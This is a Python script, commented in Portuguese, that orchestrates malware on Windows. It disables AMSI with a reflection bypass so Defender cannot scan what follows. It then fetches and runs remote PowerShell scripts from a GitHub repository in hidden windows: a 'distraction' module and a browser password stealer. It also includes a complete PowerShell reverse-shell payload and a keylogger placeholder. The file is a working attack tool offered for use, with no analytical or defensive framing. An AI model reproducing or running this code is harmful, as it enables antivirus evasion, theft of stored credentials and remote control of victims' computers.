import subprocess
import time
import sys
import os

# ========== CONFIGURAÇÕES (URLs dos módulos) ==========
ANDRE_URL = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/ANDRE.ps1"
BROWSER_URL = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/BROWSER-ALL.ps1"
# Adicione aqui novos módulos:
# REVERSE_SHELL_URL = "https://..."
# KEYLOGGER_URL = "https://..."

# ========== FUNÇÃO DE BYPASS DO AMSI (via PowerShell ofuscado) ==========
def kill_amsi():
    """
    Desabilita o AMSI usando reflexão com strings ofuscadas por [char].
    Isso impede que o Defender inspecione o conteúdo dos scripts executados.
    """
    amsi_payload = (
        "[Ref].Assembly.GetType("
        "('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static')"
        ".SetValue($null,$true)"
    )
    # Executa o bypass em uma instância oculta do PowerShell
    subprocess.run(
        ['powershell', '-NoP', '-W', 'Hidden', '-Exec', 'Bypass', '-C', amsi_payload],
        capture_output=True, timeout=10
    )

# ========== FUNÇÃO PARA EXECUTAR UM SCRIPT PS1 REMOTO ==========
def run_ps_script(url, hidden=True):
    """
    Baixa e executa um script PowerShell da URL fornecida.
    O AMSI já deve estar morto antes de chamar esta função.
    """
    flags = '-W Hidden' if hidden else '-W Normal'
    cmd = f'powershell -NoP {flags} -Exec Bypass -C "iex (iwr \'{url}\' -UseBasicParsing).Content"'
    # Usa Popen para não travar o orquestrador
    proc = subprocess.Popen(cmd, shell=True)
    return proc

# ========== MÓDULOS ADICIONAIS (exemplos) ==========
def reverse_shell(ip, port):
    """Estabelece uma reverse shell do PowerShell (exemplo)."""
    payload = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }}; $client.Close()"
    cmd = f'powershell -NoP -W Hidden -Exec Bypass -C "{payload}"'
    subprocess.Popen(cmd, shell=True)

def keylogger(url_to_post):
    """Ativa um keylogger que envia logs para a URL especificada (exemplo)."""
    # Seria um script PS1 hospedado
    pass

# ========== ORQUESTRADOR PRINCIPAL ==========
def main():
    # 1. Desligar AMSI
    kill_amsi()
    time.sleep(1)  # Pequena pausa

    # 2. Executar distração (em paralelo, para não travar)
    print("[*] Iniciando distração...")
    distracao_proc = run_ps_script(ANDRE_URL)
    time.sleep(3)  # Aguarda a distração tomar conta

    # 3. Executar roubo de senhas
    print("[*] Iniciando roubo de dados...")
    roubo_proc = run_ps_script(BROWSER_URL)

    # 4. (Opcional) Adicione aqui outros módulos:
    # reverse_shell('192.168.1.100', 4444)
    # keylogger('https://...')

    # O script BROWSER-ALL.ps1 já chama o CLEANER-MASTER.ps1 ao final.
    # Portanto, não precisamos nos preocupar com a limpeza.

    # Aguarda a finalização do processo de roubo (opcional)
    roubo_proc.wait()
    print("[+] Fluxo concluído.")

if __name__ == '__main__':
    main()
